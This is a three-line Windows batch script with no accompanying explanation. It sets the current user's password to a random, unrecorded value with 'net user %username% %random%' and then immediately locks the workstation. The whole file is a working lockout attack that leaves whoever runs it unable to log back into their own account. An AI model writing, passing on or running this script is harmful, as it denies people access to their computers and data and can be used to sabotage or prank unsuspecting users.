@echo off
net user %username% %random%
rundll32.exe user32.dll,LockWorkStation